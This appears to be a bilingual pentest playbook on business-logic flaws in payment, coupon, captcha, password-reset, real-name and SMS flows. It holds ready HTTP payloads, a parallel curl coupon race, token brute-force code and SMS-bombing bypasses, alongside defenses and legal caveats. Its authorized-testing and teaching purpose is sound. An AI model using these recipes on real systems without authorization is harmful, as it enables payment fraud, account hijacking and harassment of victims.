│   业务建模：把目标产品当成一台状态机来读                         │
│   ├── 角色清单 (admin / user / vip / guest / 内部接口调用方)     │
│   ├── 资源清单 (订单 / 余额 / 优惠券 / 积分 / VIP / 个人资料)    │
│   ├── 状态字段 (paid / unpaid / refunded / shipped / received)   │
│   └── 关键金钱/资产流向 (谁付钱、谁拿钱、谁能撤销)                │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 2: State Machine & Data Flow Analysis                      │
│   状态机/数据流分析：每一步状态由谁决定？                       │
│   ├── happy path 走通                                            │
│   ├── 抓全所有跳转请求 + 响应                                    │
│   ├── 标出哪些字段是"前端传的"vs"服务端回写的"                  │
│   └── 找跨步骤复用的 token / order_id / coupon_id / status       │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 3: Attack Surface Classification                           │
│   攻击面分类：用 5×N 矩阵代替"凭感觉"                            │
│   ├── 5 类操作：参数篡改 / 流程跳跃 / 重放 / 并发 / 替换身份     │
│   └── N 个业务模块：注册 / 登录 / 找回 / 支付 / 优惠 / 订单 / ...│
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 4: Checklist-Driven Testing                                │
│   按 CHECKLIST.md 逐条复测，每条带 "为什么会出问题 + 如何复测"  │
└────────────────────────────┬────────────────────────────────────┘
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 5: Human Judgement & Reporting                             │
│   人脑判断：服务端是否真的接受？业务上是不是真的"占便宜"？      │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Phase 1: Business Modeling / 业务建模

> 业务逻辑漏洞的本质：**不了解业务功能，就找不到脆弱点。**

### 2.1 Role enumeration / 列清角色

不仅是 UI 上能切换的角色，**审计代码 / 抓包响应 / 错误回显**里出现过的所有角色都要列：

```text
guest               不登录可以走到哪一步
user (普通)         绑定手机后能做什么
vip / paid          付费用户的特权接口列表
admin / super       管理员功能与 admin URL 路径
internal / cron     /api/internal/* 这种"按理不该外网可达"的路径
third-party caller  webhook、回调、签约方调起的接口
```

**实战要点**：很多 Java Web 项目仅依赖 `if (user.role == "admin")` 跳页面，**没有 Filter 也没有 Spring Security 全局拦截**，意味着所有 `/teacher/*` 这类"按理只有特定角色能访问"的 URL，guest 直接 GET 也能拿到数据。这类系统应当默认所有非登录页都未授权。

### 2.2 Resource and asset inventory / 列清资产

凡涉及"钱、积分、库存、VIP 时长、优惠券、邀请码、个人隐私"的字段都列出来：

```text
amount / total / price / discount_amount / shipping_fee
balance / points / coupon_balance / gift_card_balance
quantity / stock / max_per_user
vip_level / vip_expire_at / membership_status
real_name / id_card / phone / email / avatar
```

任何**前端可见但又能被请求体改动**的资产字段，都是攻击优先级 P0。

### 2.3 Money / privilege flow / 画清钱权流向

```
支付场景：              退款场景：
  user → pay → order      order → refund → user
                          (能不能让钱回流的同时又不退货？)

VIP 场景：              邀请场景：
  user → pay → vip(time)  inviter ← reward ← invitee_register
                          (能不能 invitee 自己注册自己刷返佣？)
```

参考自 8.逻辑漏洞.pdf page_00009 的支付攻击面图：

- **订单**：改价 / 负数 / 库存冲突 / 零库存购买 / 改订单金额
- **结算**：优惠券复用 / 拦截改金额、改支付方式 / 伪造刷单
- **支付**：伪造第三方确认 / 窃取付款信息
- **退货**：绕过商家或商品类型限制
- **收货**：绕过客户确认

---

## 3. Phase 2: State Machine and Data Flow / 状态机分析

### 3.1 三步法（标准排查流程）

来自 逻辑漏洞checklist.pdf page_00003：

```
1. 明确流程       让真实账号把 happy path 完整走一遍，全程 Burp 抓包
2. 找可操控环节   每一步都问：这一步的状态是前端传的，还是服务端独立判定的
3. 改参重放对比   只改其中一个变量，与原始包对比响应差异
```

### 3.2 Server-side vs client-side fields / 区分谁说了算

每抓到一个请求都要做一个分类：

| 字段类型 | 例子 | 风险 |
|---|---|---|
| 服务端必须强校验 | `price`, `amount`, `quantity`, `user_id`, `vip_level`, `payment_status` | P0：前端可改即漏洞 |
| 服务端二次计算 | `total = sum(items.price * items.qty)` | 看后端是否信任前端传过来的 total |
| 服务端只用作 hint | `currency_display`, `ui_theme` | 一般不构成漏洞 |
| 客户端伪状态 | `success:true`、`error_code:1`、`is_paid:1` | P0：响应包改了能影响后续业务 |

**真实案例**（8.逻辑漏洞.pdf page_00022/page_00023）：修改手机号场景，服务端返回 `{"error_msg":"旧密码错误","error_code":99999,"success":false}`，攻击者把响应改成 `{"success": true,"error_code": 1}`，前端"看到 success 就放行"导致绕过密码校验直接换绑手机号。**根因是客户端过度信任服务端响应里的状态字段**，必须在服务端独立持久化"该用户是否已通过密码验证"。

### 3.3 跨步骤数据追踪

找出一切**会跨步骤复用**的标识符：

```
order_id     一笔订单从下单 → 支付 → 发货 → 售后用的是不是同一个？是否可被替换？
coupon_id    应用优惠券、提交订单、支付时是否每一步都重新校验？
auth token   找回密码 token / 邮箱验证 token / 邀请 token 是否有效期、是否一次性、是否绑会话
session_id   登录前后 session 是否换发？修改邮箱 / 密码后是否吊销
nonce        防重放参数有没有？服务端是否真的拒绝重复 nonce？
```

逻辑漏洞checklist.pdf page_00011 给出一个经典例子：找回密码 URL `resetpassword.php?id=MD5`，如果 auth 是用 PHP 老版本 Windows 下的 `rand()`（最大值 32768）生成 md5，攻击者可以本地遍历 0~32768 全量计算 md5 字典，**整个找回密码机制相当于失效**。

```php
$a=0; for ($a=0;$a<=32768;$a++){ $b=md5($a); echo "\r\n"; echo $b; }
```

---

## 4. Phase 3: Attack Surface Matrix / 攻击面 5×N 矩阵

把攻击面拆成"操作 × 业务模块"的二维表，每个格子有固定测试套路：

|   | 注册 | 登录 | 找回密码 | 支付/充值 | 优惠/积分 | 订单 | VIP/会员 | 验证码 | 隐私/资料 | 第三方/回调 |
|---|------|------|---------|----------|----------|------|---------|--------|-----------|-------------|
| **参数篡改** | 改 token | 改 user_id | 改邮箱/手机号 | 改金额/数量 | 改面值/复用 | 改总价 | 改等级 | 删验证码字段 | 改 user_id | 改回调 url |
| **流程跳跃** | 跳过验证码 | 跳 2FA | 跳验证步直接到改密 | 跳支付到确认 | 跳活动时间窗口 | 跳收货 | 跳付费直接开通 | 跳人机验证 | 跳所有人审 | 跳签名校验 |
| **重放** | 重放注册请求 | 重放登录 | 重放重置 token | 重放支付回调 | 重放领券 | 重放下单 | 重放充值 | 重放短信触发 | 重放修改 | 重放回调 |
| **并发** | 同邮箱并发注册 | 撞库爆破 | 抢 token 窗口 | 双花 / 并发付款 | 优惠券双开 | 超卖 | 多端并发升级 | 验证码并发触发 | 并发改资料 | 回调并发触发 |
| **替换身份** | 改 cookie 注册他人 | 越权登录 | 改手机号收他人验证码 | 替换收款人 | 替换领券人 | 替换订单归属 | 替换 vip user | 改手机号收码 | 改 user_id 越权 | 替换商户号 |

**用法**：每个项目至少把矩阵全过一遍，能想出测试用例就在 CHECKLIST.md 里把对应行打钩。

### 4.1 真实案例索引到矩阵

| 案例 | 矩阵位置 | 出处 |
|------|---------|------|
| 删除 `prizeIdList` 字段实现 0 元购 | 参数篡改 × 支付 | 8.逻辑漏洞.pdf page_00010 (Keep 跑步活动) |
| `quantity:0.02` 实现半价 | 参数篡改 × 订单 | 8.逻辑漏洞.pdf page_00011 (商城) |
| `quantity=999999999` 整数溢出归零 | 参数篡改 × 支付 | 8.逻辑漏洞.pdf page_00008 |
| Burp Turbo Intruder `concurrentConnections=30` 绕过短信限频 | 并发 × 验证码 | 8.逻辑漏洞.pdf page_00016 |
| 删除 `JSESSIONID` 重置验证码次数 | 参数篡改 × 验证码 | 8.逻辑漏洞.pdf page_00017 |
| 修改响应 `success:false → true` 绕过改手机号 | 参数篡改 × 隐私 | 8.逻辑漏洞.pdf page_00022 |
| 故意填错身份证使审核驳回，反复修改实名 | 流程跳跃 × 隐私 | 8.逻辑漏洞.pdf page_00029 |
| 抓包发现 `previewPullUrl: *.flv` 直链下载 VIP 资源 | 参数篡改 × VIP | 8.逻辑漏洞.pdf page_00032 |
| 多设备并发签约领新人优惠 | 并发 × VIP | 逻辑漏洞checklist.pdf page_00012 |
| Cookie 替换实现水平/垂直越权 | 替换身份 × 隐私 | Java Web 鉴权审计经典案例 |
| `..//` 路径截断绕过 Filter | 流程跳跃 × 登录 | Java Filter 路径规范化缺陷 |
| `;` 分号截断 Servlet 路径绕过 Filter | 流程跳跃 × 登录 | Servlet getRequestURI 不规范化 |
| 数据库 `sys_menu` 重复行致权限残留 | 替换身份 × VIP | RBAC 数据一致性审计 |
| `host_scan.py` Host 碰撞 | 业务建模 × 第三方 | 内部资产发现实战 |

---

## 5. Phase 4: Checklist-Driven Testing / 按 CHECKLIST 复测

实际操作阶段直接打开 [CHECKLIST.md](./CHECKLIST.md)，**按业务模块从上到下走**，每条都问：

1. **为什么会出问题**：这条 checklist 项的根因（前端校验、状态机缺失、并发竞态、签名缺失……）
2. **如何复测**：精确到 Burp 步骤 / payload / 期望响应，能让另一个人按描述复现

CHECKLIST.md 里每条都已经按这两栏给出，本节不再重复。

### 5.1 工具栈最佳实践

| 工作 | 推荐工具 | 备注 |
|------|---------|------|
| 抓包/重放 | Burp Suite Repeater | 必备 |
| 并发竞态 | Burp Turbo Intruder / Repeater Group "Send in parallel" | 课件多次出现 |
| 撞库爆破 | Burp Intruder + 字典 | 4 位纯数字验证码 5 分钟可枚举完毕 |
| Host 碰撞 | `python3 host_scan.py -d target.com -t 100` | github.com/AlphaSec/host_scan |
| OCR 验证码 | tesseract | 弱验证码可识别 |
| Java 代码审计 | IntelliJ IDEA + Find in Path 搜 `Filter`、`@PreAuthorize`、`request.getRequestURI` | Spring/Servlet 鉴权代码审计标配 |
| 数据库一致性核对 | Navicat | 验证"前端删了、库里还在" |
| 自动化签名爆破 | 本地 PHP/Python `for $i = 0..32768: md5($i)` | 弱随机数 token 直接全量 |

---

## 6. Phase 5: Human Judgement / 人脑判断要点

> 看到 200 不等于打到漏洞。

### 6.1 三个关键追问

每个疑似漏洞触发后，**先问自己这三件事再写报告**：

1. **业务真的占了便宜吗？**
   - 例：响应 `success:true` 但实际个人中心没看到订单 → 不算
   - 例：抢到了优惠券但提交订单时被服务端二次校验拒绝 → 不算
   - 必须看到"会员时长真增加了/钱真扣了别人的/数据真返了不该返的"才算实证

2. **是技术成功还是业务成功？**
   - 0.019 元充值实际只扣 0.01 元但钱包真增加 0.02 元 → 业务成功（8.逻辑漏洞.pdf page_00013）
   - 抓到 flv 直链但带 token/Referer 校验导致 VLC 播不开 → 仅技术成功，要继续测试看能否绕过签名

3. **可复现吗？**
   - 并发漏洞：复测 5 次至少 3 次成功才算稳
   - 整数溢出：注意可能引发服务端崩溃，**必须有书面授权**才打（8.逻辑漏洞.pdf page_00008）

### 6.2 别误把功能当成漏洞

业务逻辑漏洞实践中反复强调一个判定标准：

> "判断是否为有效漏洞的标准是：最终获得的权益价值 > 正常单独购买所需成本。"

例：发现可以"先支付 1 元试用，再补 99 元升级 VIP" → 这本来就是产品设计的会员升级路径，不是漏洞。
真的漏洞是："多端并发补差价 → 多次到账 VIP 时长" → 同一笔补差价获得了 N 倍权益。

### 6.3 法律边界

8.逻辑漏洞.pdf page_00001 / page_00002 把法律红线讲得非常具体，**任何团队培训时都应该带着读一遍**：

- 《网络安全法》第 22 条：禁止任何形式的网络入侵、干扰、窃密以及工具/方法提供
- 《网络安全法》第 38 条：严禁非法获取、出售或提供公民个人信息
- 《刑法》第 285 条 + 修正案 7：非法控制或获数情节严重可判七年；提供入侵工具/明知他人犯罪仍提供支持，按共犯论处

实操底线：

- 必须有书面授权（且明确目标系统范围、时间窗口、可触及的数据类型）
- 不接触/不存储/不传输任何真实公民个人信息（实名认证类漏洞复测严禁用真人身份证）
- 测试工具不应为"专为入侵而设计"（同时审查脚本来源、用途说明、是否被列为恶意软件）
- 触发整数溢出/资源耗尽类漏洞前需取得二次确认，避免造成服务停摆

参见 8.逻辑漏洞.pdf page_00001 的合规 checklist：

```
□ 测试活动未涉及未经授权的系统访问或数据提取  
  why: 违反网安法第 22 条及刑法 285 条可能构成犯罪
  verify: 检查授权书范围 / 目标系统清单 / 数据采集日志

□ 所用测试工具非专为入侵或非法控制设计
  why: 刑法 285 条修正案禁止提供专门用于侵入的工具
  verify: 审查工具来源 / 用途说明 / 是否被公开列为恶意软件

□ 不接触、存储或传输任何公民个人信息
  why: 网安法第 38 条禁止非法获取或提供个人信息
  verify: 审计测试数据样本 / 数据库查询记录 / 导出文件内容
```

---

## 7. Quick Reference: A One-Page Decision Tree / 单页决策树

```text
看到一个新接口 / 新业务流，按以下顺序问问题：

Q1  这一步的关键状态字段（金额、用户身份、订单状态、权限）有没有走前端？
    └── 有 → 改一下试试，参数篡改 P0
        └── 没成功 → Q2
        └── 成功了 → 看 6.1 三个追问，写报告

Q2  能不能跳过这一步直接到下一步？
    └── 后端有没有 Filter / 中间件做全局校验？
        └── 没有 → 直接打下一个 URL（Java Web 仅靠 Servlet 跳页面而无 Filter 的经典缺陷）
        └── 有 → 试试 ../ 截断（Filter 路径规范化缺陷）或 ; 分号截断（getRequestURI 不规范化）
        └── 都不行 → Q3

Q3  能不能并发突破限制？
    └── 限频接口 → Burp Turbo Intruder concurrentConnections=30
    └── 限单接口 → 双花、双领券、双签约
        └── 都不行 → Q4

Q4  能不能改身份？
    └── Cookie 替换：低权 cookie 拿不到，admin cookie 拿到 → 越权
    └── user_id 替换：改请求里的 uid 拿到他人数据 → 水平越权
    └── 替换收款方：改 username 让他人扣款 → 用户替换攻击 (checklist.pdf page_00017)
        └── 都不行 → Q5

Q5  能不能重放？
    └── 支付回调签名校验？没有 → 重放成功 → 重复发货
    └── 找回密码 token 一次性？没有 → 重复改密
        └── 都不行 → 转 Q6

Q6  能不能改响应？
    └── 客户端是不是只看 success/error_code 字段？
    └── Burp 改响应 success:false → success:true 看前端会不会放行
        └── 都不行 → 这个接口暂判可信，去打下一个

Q7  实在没思路 → 回 PHASE 1，对着没读懂的业务再读一遍代码
    └── Find in Path: Filter / @PreAuthorize / request.getRequestURI / sessionAttribute
    └── 找数据库一致性问题（如 sys_menu 重复行导致权限取消未生效）
```

---

## 8. References / 参考索引

- [SKILL.md](./SKILL.md) — 业务逻辑漏洞 attack playbook（英文）
- [SCENARIOS.md](./SCENARIOS.md) — 支付精度/竞态/验证码/找回密码/枚举的细化 scenario（英文）
- [CHECKLIST.md](./CHECKLIST.md) — 按业务模块分组的可勾选检查项（双语）
- 蒸馏原始素材（外部，未入库）：
  - 业务逻辑漏洞审计课程录像
  - 业务逻辑漏洞 PDF 教材与 checklist 教材
  - 蒸馏管道脚本：托管在 yaklang-ai-training-materials 仓库的 `scripts/` 目录下，包含 `distill-vuln-videos-by-omni.yak` / `distill-vuln-pdfs-by-omni.yak` / `aggregate-vuln-dumps.yak` / `distill-business-logic-vuln-videos.yak` / `aggregate-distill-topics.yak` / `clean-distill-buckets-by-llm.yak`。


---
# Part 4: Business Logic Scenarios


## 1. Payment Precision and Overflow Attacks

### Integer Overflow

```text
# 32-bit signed int max: 2,147,483,647
# If quantity or price field is int32:
quantity: 2147483648 → overflows to negative → credit instead of debit

# In C/Java: int amount = price * quantity;
# If both are large positive → result wraps to negative
```

### Decimal Precision Exploitation

```text
# Item price: ¥10.00, quantity supports decimals:
quantity: 0.001  → charge: ¥0.01 (rounds down)
# But you still receive 1 item

# Partial refund manipulation:
# Original order: 3 items × ¥100 = ¥300
# Request refund for 2.9 items → refund ¥290 → keep all 3 items
```

### Negative Value Attacks

```text
# Negative quantity:
{"item": "laptop", "quantity": -1, "price": 999}
→ Total: -¥999 → credit to account

# Negative shipping fee:
{"shipping_method": "express", "shipping_fee": -50}
→ Reduces total order cost

# Negative discount:
{"discount_amount": -100}
→ Adds ¥100 instead of subtracting
```

### Payment Parameter Tampering

Parameters to test modifying via Burp:

```text
price / amount / total         → change to 0.01
discount_code / coupon_id      → reuse / stack
currency / currency_code       → change to weaker currency
payment_method / gateway       → switch to test/sandbox gateway
installments / period          → change to 0 or negative
account_id / receiver          → change to attacker's account
return_url / notify_url        → change to attacker's server (capture payment confirmation)
```


## 2. Condition Race — Practical Patterns

### One-Coupon-Per-Order Bypass

```bash
# Send 20 parallel requests using the same coupon:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=..." \
    -d "coupon=SAVE50&order_id=12345" &
done
wait
# If check and deduction are non-atomic → multiple applications succeed
```

### Gift Card Double-Spend

```text
# Burp Repeater: duplicate the redemption request 10 times
# "Send group in parallel" (Turbo Intruder or Repeater Groups)
# Race window: balance check → deduction
# Multiple threads pass the balance check before any deduction commits
```

---

## 3. Captcha Bypass Techniques

### Drop the Verification Request

```text
# Normal flow:
1. Browser requests captcha image from /api/captcha
2. User enters captcha text
3. Form submits with captcha value

# Bypass: Use Burp to DROP the request to /api/captcha
# The server-side captcha remains the same → use the same captcha value repeatedly
```

### Remove the Captcha Parameter

```text
# If backend checks: "if verifycode parameter exists, validate it"
# Remove the parameter entirely from the request:
# Before: username=admin&password=test&verifycode=abc123
# After:  username=admin&password=test
# → Old code path without captcha validation
```

### Reset Captcha Failure Counter

```text
# Some apps track failed attempts in session/cookie
# Clear cookies between attempts → failure counter resets to 0
# Or: create new session for each brute force attempt
```

### OCR-Based Captcha Cracking

```python
from PIL import Image
import pytesseract

# pip install pytesseract Pillow
# brew install tesseract (macOS)

img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(f"Captcha: {text.strip()}")
# Accuracy improves with preprocessing: grayscale, threshold, denoise
```

---

## 4. Arbitrary Password Reset Vulnerabilities

### Predictable Reset Token

```text
# Token patterns that are attackable:
token = md5(username)           → compute for any user
token = md5(email + timestamp)  → narrow brute force window
token = base64(user_id)         → trivially reversible
token = sequential_number       → enumerate
token = username + 4_digit_rand → brute force 0000-9999
```

### Session Replacement Attack

```text
# Flow: Reset password for your own account
# Step 1: Request reset for YOUR email → receive link
# Step 2: Click link → reach "enter new password" page
# Step 3: In the same session, change the username/email parameter to VICTIM
# Step 4: Submit new password → server uses session state (which user) not the parameter
# If session tracks "reset in progress" but not "for which user" → reset victim's password
```

### Registration Overwrite

```text
# If username is unique but registration doesn't check existing accounts properly:
# Register with victim's username → old account is overwritten or merged
# Now login with the password you just set → access victim's data
```

---

## 5. User Information Enumeration

### Login Error Message Difference

```text
# Vulnerable:
username: admin     → "Incorrect password" (confirms user exists)
username: nonexist  → "User not found" (confirms user doesn't exist)

# Secure:
Both cases → "Invalid username or password"
```

### Masked Data Reconstruction

```text
# Phone number masking: 138****5678
# Email masking: a****@gmail.com
# If different endpoints mask differently:
#   Endpoint A: 138****5678
#   Endpoint B: 1384***5678
#   Endpoint C: 13845**678
# Combine → reconstruct: 13845675678
```

### Cookie-Based Authorization Bypass

```text
# Cookie: uid=dXNlcjE=  (base64 of "user1")
# Change to: uid=YWRtaW4x  (base64 of "admin1")
# If server trusts the cookie without server-side session validation → vertical privilege escalation
```

---

## 6. Functional Restriction Bypass

### Array Parameter for Multiple Coupons

```text
# Normal: couponid=SAVE20 (one coupon per order)
# Bypass: couponid[0]=SAVE20&couponid[1]=SAVE30
# Or JSON: {"coupon_ids": ["SAVE20", "SAVE30", "WELCOME10"]}
# If backend iterates the array and applies each → stacks discounts beyond limit
```

### Frontend-Only Restrictions

```text
# HTML: <input type="text" disabled="disabled" readonly="readonly" value="110010">
# Developer Tools: remove disabled/readonly attributes → field becomes editable
# Or: Burp intercepts response → removes disabled attribute → user can modify
# Or: directly craft POST request with modified value
```

---

## 7. Denial of Service via Business Logic

### Application-Layer DoS (not DDoS)

```text
# Single malformed request causes CPU spike:
# CVE-2015-4024: PHP multipart/form-data with crafted boundary → regex backtracking
# CVE-2020-13935: Tomcat WebSocket with crafted frames → infinite loop
# CVE-2013-2028: Nginx chunked transfer with negative size → buffer overflow

# Tools:
# tcdos — WebSocket DoS tool:
python3 tcdos.py -u ws://target/endpoint -t 10
```

---

## 8. PAYMENT MANIPULATION MATRIX

| # | Attack | Method |
|---|---|---|
| 1 | Price parameter tampering | Change `amount=100` to `amount=1` in checkout request |
| 2 | Negative quantity/amount | `quantity=-1` or `amount=-100` for refund credit |
| 3 | Currency confusion | Change `currency=USD` to `currency=IDR` (lower value) |
| 4 | Callback notification forgery | Forge payment gateway callback to mark order as paid |
| 5 | Race condition on payment | Concurrent checkout with same cart → duplicate purchase at single price |
| 6 | Coupon stacking | Apply same coupon multiple times or combine incompatible coupons |
| 7 | Refund without return | Initiate refund flow but skip item return step |
| 8 | Payment status manipulation | Change order status from "pending" to "paid" via API |
| 9 | Split transaction bypass | Split large amount into multiple small amounts below verification threshold |
| 10 | MongoDB operator injection | `{"price": {"$gt": 0}}` instead of numeric value |

### Testing Methodology

```
1. Map the complete payment flow (cart → checkout → payment → callback → confirmation)
2. At each step, test: parameter tampering, step skipping, replay, race condition
3. Check if price is recalculated server-side or trusts client value
4. Test callback endpoint: Does it verify signature? Source IP? Idempotency?
5. Test refund flow separately: same vulnerabilities may exist in reverse
```

---

## 9. STATE MACHINE BYPASS METHODOLOGY

### Common Multi-Step Process Attacks

| Attack | How |
|---|---|
| Frontend step skip | Navigate directly to final step URL (e.g., `/step3` without completing step 1-2) |
| Response manipulation | Change `{"step":"1","allowed":"false"}` to `{"step":"3","allowed":"true"}` |
| Direct state modification | API call to change order status: `PUT /order/123 {"status":"completed"}` |
| Replay previous step | Complete step 2, then replay step 1 with modified data |
| Session swap | Start flow as user A, complete as user B (different session) |

### Verification Bypass Pattern

```
Step 1: Request verification code → code sent to email/phone
Step 2: Enter verification code → server validates
Step 3: Set new password → server allows

Attack: Skip step 2 entirely
- Try: POST /reset-password directly (step 3 URL)
- Try: Response manipulation — change step 2 response from "fail" to "success"
- Try: DOM manipulation — remove disabled attribute from step 3 form
- Try: Modify cookie/session to reflect "step 2 completed"
```

---

## 10. Privacy Compliance & Real-Name Authentication Cases / 隐私合规与实名认证场景

These four scenarios are the highest-frequency real-world cases in instructor-led classes — they are the kind that show up in compliance audits AND in bug-bounty programs because they straddle data-protection law and identity hijacking.

### 10.1 Real-Name "Replay-To-Reset" Loop

Anti-addiction or KYC systems often allow re-editing identity info **only when** a previous submission was rejected. Bypass:

```text
1. Submit real-name auth with INTENTIONALLY wrong cardNumber:
   POST /auth/realname  
   {
     "realName": "测试",
     "cardNumber": "...6012",   ← wrong on purpose
     "frontImage": "<base64>",
     "backImage":  "<base64>"
   }

2. Server response (the surprising part):
   {"msg": "success", "code": 200, "data": null, "ok": true}
   ← server stores it as "submitted/审核中", but business logic treats this as "rejected"

3. UI now offers an Edit button → resubmit again with another (target) identity
   → real-name binding switches WITHOUT triggering the "permanent lock" branch
```

**Why this works**: the controller writes "submitted" to DB on every POST and the rejection branch resets the editable flag instead of locking the user. **Defense**: rejected real-name submissions must (a) require human review or (b) lock the account for 24h+, never silently re-open the editor.

**Compliance impact**: this enables anti-addiction circumvention (minors), account resale (changing the bound identity to launder the account), and KYC laundering.

### 10.2 Identity Card / Phone Enumeration via Side-Channel

A KYC pre-check API answers "is this realName + idCard combo valid?" through subtle response differences:

```text
Burp Intruder payload: incrementing idCard suffixes
Status: 200 (always), but Length differs:
  Length: 531  ← "first valid combination"  
  Length: 501  ← invalid

Or response code differences:
  HTTP 200 + body code:200  → valid binding
  HTTP 200 + body code:501  → wrong card
  HTTP 200 + body code:531  → name-card mismatch but card exists

Comment column in Burp Intruder: "Contains a JWT" → suggests the response leaks a token
when the verification succeeds, useful for follow-on impersonation.
```

**Defense**: unify all failure paths into one indistinguishable response (same status, same Length, same body). Add per-IP / per-deviceId throttling.

### 10.3 Masked Field Cross-Endpoint Reconstruction

Phone numbers like `13845675678` are masked differently across endpoints:
```
/api/profile/me        → 138****5678
/api/order/list        → 1384***5678
/api/coupon/list       → 13845**678
/api/notice/preview    → 138456*5678
```
Combine the masked positions across endpoints to reconstruct the full digits. Same applies to email addresses (`a****@gmail.com` vs `ab***@gmail.com`).

**Defense**: pick ONE masking rule and enforce it via a shared library. Unit-test that all serializers produce byte-identical output for the same field.

### 10.4 Sensitive Field Leak in Common Responses

Profile / login / cart responses often over-expose:
```http
GET /api/user/profile
{
  "id": 31, "username": "alice",
  "password": "$2a$10$...",          ← BCrypt hash leaks
  "id_card": "320...8412",          ← full ID card
  "phone": "13888888888",           ← unmasked phone
  "real_name": "...",
  "address": "..."
}
```
Verify: search every single response for the keys `password`, `passwd`, `salt`, `id_card`, `idcard`, `身份证`, `cardNumber`, `bankCard`, `email`, `phone`, `mobile`. If any user-related response contains them — that's a P1 finding by itself.

**Compliance impact**: 网安法 §38, GDPR Art. 5(1)(c) "data minimisation".

---

## 11. Payment Vulnerability Cases / 支付逻辑漏洞实战场景

### 11.1 0元购 via `prizeIdList` Removal — Activity Registration

**Target**: Keep app "命中注定 520 | 小天使主题线上跑" event registration (paid prizes).

```http
POST /activity/register
{
  "activityId": "...",
  "prizeIdList": ["6264e6948fe587000113e2d9"],
  "userId": "..."
}
→ {"ok": true, "payType": "paid", "amount": 38}

# Modified request — prizeIdList REMOVED entirely
POST /activity/register
{
  "activityId": "...",
  "userId": "..."
}
→ {"ok": true, "payType": "free"}      ← ✅ 0 元报名成功，仍然生效
```

**Reproduce**: Burp intercept the registration request, delete the entire `prizeIdList` key, forward.

**Root cause**: server treats "no paid prize listed" as "no payment required", but the activity DB record still grants the event seat.

### 11.2 0元购 via Decimal Quantity — Shopping Cart

**Target**: B2C e-commerce (laptop ¥500).

```http
PUT /cart/update
{"id": 114016, "skuQty": 0.02}

# Cart UI shows: ¥500.00 → ¥10.00
# Checkout passes, modal payment dialog charges ¥10
# Order shipped: 1 full laptop
```

**Variant — food delivery**:
```http
POST /order/place
{"items": [{"FoodNum": 0.01, "foodId": 88}]}

# 长鱼汤 ¥68 → 应付 ¥0.68
# orderId: 2206100122496404, payStatus: 1
```

**Defense rule**: in any quantity field validate `quantity ∈ ℤ ∧ quantity ≥ 1` server-side. Never multiply float quantity by float price; convert to integer cents and integer count.

### 11.3 Half-Price Recharge via Decimal Precision

```http
POST /wallet/recharge
{"amount": 0.019}

# Pay gateway charges: ¥0.01 (rounded down)
# Wallet credit:       ¥0.02 (rounded up)
# Net per cycle:       ¥0.01 free
```

**Defense**: keep all monetary values as integer cents end-to-end. Do not let the front-end submit fractional cents.

### 11.4 Negative Coupon / Negative Quantity — Reverse Charge

```http
POST /checkout
{"price": 99, "couponAmount": -100}     → final price = 99 + 100 = 199 ❌
{"itemId": "x", "quantity": -5, "price": 100}  → total = -500 → bank credit
```

Test order: per-field, swap to `-1`, `0`, `99999999`, `0.01`, `-99.99`. Note pgsql vs mysql vs application-level handle these differently.

### 11.5 Status Field Forgery — Skip Real Payment

```http
POST /order/submit
{
  "cart_id": "1234",
  "payment_status": "paid",       ← client-controlled, server trusts
  "is_paid": 1
}
→ {"orderStatus": "success"}
```

Companion bug — client trusts a server response field:
```http
# Real server response:
{"error_msg":"旧密码错误","error_code":99999,"success":false}
# Modified by Burp on the way back to the browser:
{"success": true, "error_code": 1}
```
Front-end's `if (response.success) { goNextStep(); }` happily proceeds. This pattern shows up in change-password / change-phone / withdraw-money / sensitive flows.

### 11.6 Coupon / Optional Currency Fields — Stack & Override

The full per-field test list (Burp tab "Params" → modify each):
```
price | amount | total | total_amount | total_price       → 0.01, -100, 999999999
discount_code | coupon_id | coupon_amount               → reuse, stack, negative
currency | currency_code | currency_unit                → switch USD ↔ IDR ↔ VND
payment_method | gateway | channel                     → invalid name, sandbox name
installments | period                                  → 0, -1, 99
account_id | receiver | username | uid                 → swap to attacker / victim
return_url | notify_url | callback_url                  → attacker server (capture confirmation)
```

### 11.7 Multi-Device Concurrent Subscription Discount

Already covered in [SKILL.md §2 Multi-Device Concurrent VIP Subscription](./SKILL.md). Practical Burp recipe:

```text
1. Login same account on 3 devices (or 3 browser sessions in incognito)
2. On each, walk through to the "支付" sheet but DO NOT click pay yet
3. On device 1, complete payment → wallet/VIP +1 month at 优惠价
4. Within 30s, complete payment on device 2 → +1 month at 优惠价 again (服务端没锁)
5. Repeat on device 3
→ One discount = N months VIP
```

Same trick on "补差价升级会员" (上级 VIP from monthly to yearly while the system thinks each top-up is the first).

---

## 12. Registration / Captcha Real-World Cases / 注册与验证码实战场景

### 12.1 Captcha Not Bound to Phone Number — Account Hijack via Registration

```text
Normal flow:
  1. Enter phone: 13888888887
  2. Receive SMS code: 1468
  3. POST /register  body: {"phone": "13888888887", "code": "1468", "username": "self"}

Bypass flow:
  1. Send code to YOUR phone:  13888888887 → code "1468" arrives
  2. Burp intercept the registration POST:
     {"phone": "VICTIM_PHONE", "code": "1468", "username": "self"}
  3. Backend only checks "the latest issued code is 1468" globally → registers a NEW
     account bound to VICTIM_PHONE → if the system also offers "register login by phone",
     the victim is now locked out / impersonated.
```

**Defense**: pair (phone, code) atomically — code is only valid for the phone it was sent to.

### 12.2 SMS Bombing — Six Bypass Patterns

When the basic flow `POST /sendCode {"phone": "..."}` is rate-limited, real-world bypasses:

```text
1. CONCURRENCY:  Turbo Intruder concurrentConnections=30 (see SKILL §2)
2. COOKIE TRICK: Delete JSESSIONID → send → server resets per-session counter to 0
3. WHITESPACE / ENCODING:
     "phone": "13888888888 "     (trailing space)
     "phone": "+8613888888888"
     "phone": "008613888888888"
     "phone": "13888888888\r\n"
     "phone": "13888888888,13888888888"   (some backends split, send twice)
4. LENGTH OVERFLOW: send 12 digits "138888888889" — gateway truncates to first 11,
   while the per-number counter sees a "different" number.
5. PARAMETER POLLUTION: ?phone=A&phone=A   (or phone=[A,A] in JSON arrays)
